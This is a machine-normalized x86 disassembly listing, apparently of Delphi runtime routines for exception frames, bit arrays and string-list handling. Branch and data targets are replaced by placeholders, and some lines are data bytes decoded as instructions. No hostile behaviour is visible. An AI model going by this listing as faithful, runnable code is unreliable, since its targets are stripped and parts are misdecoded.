call sub_4142f8
sub_414778
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_414764
xor eax eax
push ebp
push sub_4147bb
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx ebx
call sub_414500
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4147c2
mov eax [ ebp - 0x4 ]
call sub_4147c8
retn
sub_4147d4
push ebx
push esi
call sub_4036d0
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_414828
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403334
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4036b8
sub_414828
push ebx
push esi
push edi
push ebp
push ecx
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x4 ]
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
test esi esi
jge r-xdata
lea eax [ esi + 0x20 ]
dec eax
test eax eax
jns r-xdata
mov eax ebx
call sub_414804
sar eax 0x5
mov edi eax
shl edi 0x2
mov eax [ ebx + 0x4 ]
add eax 0x20
dec eax
test eax eax
jns r-xdata
add eax 0x1f
sar eax 0x5
mov ebp eax
shl ebp 0x2
cmp ebp edi
je r-xdata
add eax 0x1f
mov [ ebx + 0x4 ] esi
xor eax eax
mov [ esp ] eax
test edi edi
je r-xdata
test ebp ebp
je r-xdata
mov eax edi
call sub_4026f4
mov [ esp ] eax
mov eax [ esp ]
xor ecx ecx
mov edx edi
call sub_402d44
mov eax [ esp ]
mov [ ebx + 0x8 ] eax
cmp [ esp ] 0x0
je r-xdata
mov edx ebp
mov eax [ ebx + 0x8 ]
call sub_402714
mov edx edi
mov eax ebp
call sub_41481c
mov ecx eax
mov edx [ esp ]
mov eax [ ebx + 0x8 ]
call sub_4028f0
sub_4148cc
cmp edx [ eax + 0x4 ]
jae r-xdata
cmp edx 0x0
jl sub_414804
mov eax [ eax + 0x8 ]
or cl cl
je r-xdata
push eax
push edx
push ecx
inc edx
call sub_414828
pop ecx
pop edx
pop eax
jmp r-xdata
btr [ eax ] edx
retn
bts [ eax ] edx
retn
sub_414910
push ebx
push esi
push edi
push ecx
mov ebx eax
mov eax [ ebx + 0x4 ]
add eax 0x20
dec eax
test eax eax
jns r-xdata
sar eax 0x5
dec eax
test eax eax
jl r-xdata
add eax 0x1f
mov eax [ ebx + 0x4 ]
inc eax
mov [ esp ] eax
xor esi esi
inc esi
dec [ esp ]
jne r-xdata
mov eax [ ebx + 0x8 ]
mov edi [ eax + esi * 4 ]
xor eax eax
mov eax [ ebx + 0x8 ]
mov edx [ r-xdata ]
cmp edx [ eax + esi * 4 ]
je r-xdata
jb r-xdata
and edx 0x7f
bt edi edx
inc eax
cmp al 0x20
jne r-xdata
mov edx esi
shl edx 0x5
and eax 0x7f
add edx eax
mov eax edx
mov edx [ ebx + 0x4 ]
cmp eax edx
jl r-xdata
mov edx eax
cmp dl 0x1f
ja r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax edx
jmp r-xdata
sub_414988
push ebx
push esi
call sub_4036d0
mov ebx edx
mov esi eax
mov eax esi
call sub_417080
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403334
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4036b8
sub_4149c8
push ebp
mov ebp esp
add esp 0xfffffeec
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_414a7e
push [ fs : eax ]
mov [ fs : eax ] esp
test esi esi
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_40412c
lea edx [ ebp - 0x104 ]
mov eax [ esi ]
call sub_403294
lea edx [ ebp - 0x104 ]
lea eax [ ebp - 0x4 ]
call sub_4042f8
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x114 ] eax
mov [ ebp - 0x110 ] 0xb
lea edx [ ebp - 0x104 ]
mov eax [ ebx ]
call sub_403294
lea eax [ ebp - 0x104 ]
mov [ ebp - 0x10c ] eax
mov [ ebp - 0x108 ] 0x4
lea eax [ ebp - 0x114 ]
push eax
push 0x1
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bdb4
call sub_403ad0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414a85
lea eax [ ebp - 0x4 ]
call sub_404094
retn
sub_414aa4
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_414b39
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x104 ]
mov eax [ ebx ]
call sub_403294
lea edx [ ebp - 0x104 ]
mov eax edi
call sub_4042f8
mov eax ebx
mov si 0xffff
call sub_403540
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414b40
lea eax [ ebp - 0x4 ]
call sub_404094
retn
mov eax ebx
mov si 0xffff
call sub_403540
lea edx [ ebp - 0x4 ]
mov si 0xfffe
call sub_403540
cmp [ ebp - 0x4 ] 0x0
je r-xdata
push [ ebp - 0x4 ]
push r-xdata
push [ edi ]
mov eax edi
mov edx 0x3
call sub_404414
sub_414b4b
inc [ ecx ]
add [ eax ] al
add [ esi ] ch
add [ eax ] al
add [ ebx ] dh
rol bl 0x90
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_403598
mov eax ebx
mov si 0xffff
call sub_403540
test eax eax
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffff
call sub_403540
push eax
lea eax [ ebx + 0x4 ]
call sub_4057e0
mov ecx eax
mov edx r-xdata
pop eax
call sub_4033f8
sub_414b96
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
rol [ eax ] 0x0
add [ eax ] al
add [ eax ] al
inc esi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
or eax 0xffffffff
mov eax [ eax + 0x4 ]
push eax
mov eax [ eax ]
call [ eax + 0x4 ]
jmp r-xdata
pop ebp
retn 0x4
sub_414bc8
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
or eax 0xffffffff
mov eax [ eax + 0x4 ]
push eax
mov eax [ eax ]
call [ eax + 0x8 ]
jmp r-xdata
pop ebp
retn 0x4
sub_414be8
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
mov eax ebx
call sub_4033f8
test al al
je r-xdata
mov eax 0x80004002
xor eax eax
jmp r-xdata
pop ebx
pop ebp
retn 0xc
sub_414c10
push ebx
push ecx
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ ebx + 0x4 ]
call [ eax + 0x1c ]
mov [ esp ] eax
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xc ]
mov eax [ esp ]
pop edx
pop ebx
retn
sub_414c30
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jle r-xdata
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x20 ]
xor eax eax
push ebp
push sub_414c8a
push [ fs : eax ]
mov [ fs : eax ] esp
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
cmp [ ebx + 0x8 ] 0x0
jg r-xdata
mov eax ebx
call sub_4144a4
call sub_403344
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x24 ]
retn
sub_414c98
push ebx
push esi
call sub_4036d0
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4157f0
mov edx ebx
and dl 0xfc
mov eax esi
call sub_414988
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4036b8
sub_414cc8
push ebx
push esi
push edi
push ebp
mov ebp edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x14 ]
mov edi eax
mov ecx ebp
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x60 ]
mov eax edi
pop ebp
pop edi
pop esi
pop ebx
retn
sub_414cec
push ebx
push esi
push edi
mov edi ecx
mov ebx eax
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov esi eax
mov ecx edi
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x24 ]
mov eax esi
pop edi
pop esi
pop ebx
retn
sub_414d10
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_414db7
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_414e60
xor eax eax
push ebp
push sub_414d9a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
test esi esi
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414da1
mov eax [ ebp - 0x4 ]
call sub_414f1c
retn
inc esi
xor ebx ebx
lea ecx [ ebp - 0xc ]
mov edx ebx
mov eax [ ebp - 0x8 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0xc ]
push eax
mov edx ebx
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ecx eax
mov eax [ ebp - 0x4 ]
pop edx
mov edi [ eax ]
call [ edi + 0x3c ]
inc ebx
dec esi
jne r-xdata
sub_414dc8
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax ebx
mov edx [ r-xdata ]
call sub_4034d0
test al al
je r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4149b4
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_414e60
xor eax eax
push ebp
push sub_414e48
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x44 ]
mov esi ebx
mov al [ esi + 0x4 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] al
mov al [ esi + 0x7 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x7 ] al
mov al [ esi + 0x6 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x6 ] al
mov al [ esi + 0x5 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x5 ] al
mov edx esi
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_414f1c
retn
sub_414e78
push ebp
mov ebp esp
push ebx
push esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov esi [ eax + 0x20 ]
test esi esi
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
setg bl
mov bl 0x1
mov eax [ ebp + 0x8 ]
mov eax esi
mov edx [ r-xdata ]
call sub_4034d0
test al al
je r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov edx esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_414f30
mov ebx eax
xor bl 0x1
jmp r-xdata
sub_414ed0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
push eax
push sub_415688
mov eax [ ebp - 0x8 ]
push eax
push sub_415938
push ebp
call sub_414e78
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_414f30
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_414fc5
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x9 ] 0x0
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
cmp ebx eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414fcc
lea eax [ ebp - 0x14 ]
mov edx 0x2
call sub_4040b8
retn
mov esi ebx
dec esi
test esi esi
jl r-xdata
mov [ ebp - 0x9 ] 0x1
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
lea ecx [ ebp - 0x10 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x10 ]
push eax
lea ecx [ ebp - 0x14 ]
mov edx ebx
mov eax [ ebp - 0x8 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov edx [ ebp - 0x14 ]
pop eax
call sub_4044a0
jne r-xdata
sub_414fdc
push ebx
push esi
add esp 0xfffffff8
mov esi ecx
mov ebx edx
call sub_414fd8
push eax
mov [ esp + 0x4 ] esi
mov [ esp + 0x8 ] 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x0
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bcf8
jmp sub_403ad0
sub_415014
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_41505c
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_405ca4
mov edx [ ebp - 0x4 ]
mov ecx edi
mov eax ebx
call sub_414fdc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_415063
lea eax [ ebp - 0x4 ]
call sub_404094
retn
sub_41506c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] ebx
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_415144
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_414e60
xor eax eax
push ebp
push sub_415122
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0xc ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov [ ebp - 0x8 ] eax
lea ecx [ ebp - 0x10 ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov ecx [ ebp - 0x10 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0x20 ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x24 ]
mov ecx [ ebp - 0xc ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x20 ]
mov ecx [ ebp - 0x8 ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x24 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_415129
mov eax [ ebp - 0x4 ]
call sub_414f1c
retn
sub_415160
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_4151a5
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x1c ]
mov eax [ ebp - 0x4 ]
call sub_404554
call sub_408bd8
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4151ac
lea eax [ ebp - 0x4 ]
call sub_404094
retn
sub_4151b4
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x20 ] ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4152bf
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov [ ebp - 0x10 ] eax
xor ebx ebx
lea eax [ ebp - 0x1c ]
mov edx r-xdata
call sub_40412c
mov esi [ ebp - 0x10 ]
dec esi
test esi esi
jl r-xdata
mov eax [ ebp - 0x8 ]
mov ecx ebx
xor edx edx
call sub_404184
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x14 ] eax
mov esi [ ebp - 0x10 ]
dec esi
test esi esi
jl r-xdata
inc esi
mov [ ebp - 0xc ] 0x0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4152c6
lea eax [ ebp - 0x20 ]
mov edx 0x3
call sub_4040b8
retn
inc esi
mov [ ebp - 0xc ] 0x0
lea ecx [ ebp - 0x20 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x20 ]
call sub_404354
mov edi eax
mov eax [ ebp - 0x1c ]
call sub_404354
add edi eax
add ebx edi
inc [ ebp - 0xc ]
dec esi
jne r-xdata
mov eax [ ebp - 0x1c ]
call sub_404354
mov ebx eax
test ebx ebx
je r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x18 ]
mov ecx ebx
call sub_4028f0
add [ ebp - 0x14 ] ebx
inc [ ebp - 0xc ]
dec esi
jne r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x1c ]
mov ecx ebx
call sub_4028f0
add [ ebp - 0x14 ] ebx
lea ecx [ ebp - 0x18 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ ebp - 0x18 ]
call sub_404354
mov ebx eax
test ebx ebx
je r-xdata
sub_4152dc
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_415354
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
test esi esi
jl r-xdata
mov [ ebp - 0x8 ] 0xffffffff
inc esi
mov [ ebp - 0x8 ] 0x0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41535b
lea eax [ ebp - 0xc ]
call sub_404094
retn
inc [ ebp - 0x8 ]
dec esi
jne r-xdata
lea ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov eax ebx
mov edi [ eax ]
call [ edi + 0xc ]
mov edx [ ebp - 0xc ]
mov ecx [ ebp - 0x4 ]
mov eax ebx
mov edi [ eax ]
call [ edi + 0x34 ]
test eax eax
je r-xdata
sub_415368
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_41542b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
test eax eax
jl r-xdata
mov [ ebp - 0x8 ] 0xffffffff
inc eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x8 ] 0x0
inc [ ebp - 0x8 ]
dec [ ebp - 0x10 ]
jne r-xdata
lea eax [ ebp - 0x18 ]
push eax
mov ecx esi
dec ecx
mov edx 0x1
mov eax [ ebp - 0xc ]
call sub_4045b4
mov edx [ ebp - 0x18 ]
mov ecx [ ebp - 0x4 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x34 ]
test eax eax
je r-xdata
lea ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0xc ]
mov eax ebx
call sub_4159c8
mov edx eax
lea eax [ ebp - 0x14 ]
call sub_40427c
mov eax [ ebp - 0x14 ]
mov edx [ ebp - 0xc ]
call sub_40c998
mov esi eax
test esi esi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_415432
lea eax [ ebp - 0x18 ]
mov edx 0x2
call sub_4040b8
lea eax [ ebp - 0xc ]
call sub_404094
retn
sub_41543c
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax edi
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
or esi 0xffffffff
inc ebx
xor esi esi
mov eax esi
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
dec ebx
jne r-xdata
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x18 ]
cmp ebp eax
je r-xdata
sub_415470
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x60 ]
mov ecx [ ebp + 0x8 ]
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x24 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_4154a0
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
push 0x20
mov ecx edx
mov eax [ r-xdata ]
mov dl 0x1
call sub_416504
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4154e8
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x6c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4154ef
mov eax [ ebp - 0x4 ]
call sub_403344
retn
sub_4154f4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_415591
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_414e60
xor eax eax
push ebp
push sub_415574
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov esi eax
mov eax ebx
call sub_416050
sub esi eax
lea eax [ ebp - 0x8 ]
mov ecx esi
xor edx edx
call sub_404184
mov edx [ ebp - 0x8 ]
mov ecx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0xc ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x2c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41557b
mov eax [ ebp - 0x4 ]
call sub_414f1c
retn
sub_4155a0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_415641
push [ fs : eax ]
mov [ fs : eax ] esp
cmp esi ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_415648
lea eax [ ebp - 0x8 ]
call sub_404094
retn
mov eax [ ebp - 0x4 ]
call sub_414e60
xor eax eax
push ebp
push sub_415624
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x8 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edi eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
push edi
mov ecx [ ebp - 0x8 ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x64 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_414f1c
retn
sub_415650
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] ecx
mov edi edx
mov esi eax
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ebp eax
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x48 ]
push ebp
mov ecx [ esp + 0x4 ]
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x64 ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_415688
push ebp
mov ebp esp
add esp 0xfffffff4
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41572c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
call sub_418240
mov eax [ ebp - 0x4 ]
call sub_414e60
xor eax eax
push ebp
push sub_415707
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x44 ]
jmp r-xdata
mov eax [ ebp - 0x8 ]
call sub_4172dc
test al al
je r-xdata
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_418ee0
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41570e
mov eax [ ebp - 0x4 ]
call sub_414f1c
retn
sub_415738
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
push 0xffff
mov ecx edx
mov eax [ r-xdata ]
mov dl 0x1
call sub_416504
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_415783
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x78 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41578a
mov eax [ ebp - 0x4 ]
call sub_403344
retn
sub_415790
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4157dd
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x1c ]
mov eax [ ebp - 0x4 ]
call sub_404354
mov ecx eax
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_4162b4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4157e4
lea eax [ ebp - 0x4 ]
call sub_404094
retn
sub_4157f0
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0xc ] 0x0
je r-xdata
lea eax [ ebx + 0xc ]
mov edx esi
call sub_4057f8
cmp [ ebx + 0xc ] 0x0
je r-xdata
mov eax [ ebx + 0xc ]
mov edx [ eax ]
call [ edx + 0x10 ]
pop esi
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0xc ]
mov ecx [ eax ]
call [ ecx + 0xc ]
sub_415824
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_415867
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx esi
call sub_40428c
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x2c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41586e
lea eax [ ebp - 0x4 ]
call sub_404094
retn
sub_415874
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_415928
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_414e60
xor edx edx
push ebp
push sub_41590b
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x44 ]
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_415912
mov eax [ ebp - 0x4 ]
call sub_414f1c
retn
jmp r-xdata
cmp [ ebx ] 0x0
jne r-xdata
mov eax ebx
jmp r-xdata
mov dl [ ebx ]
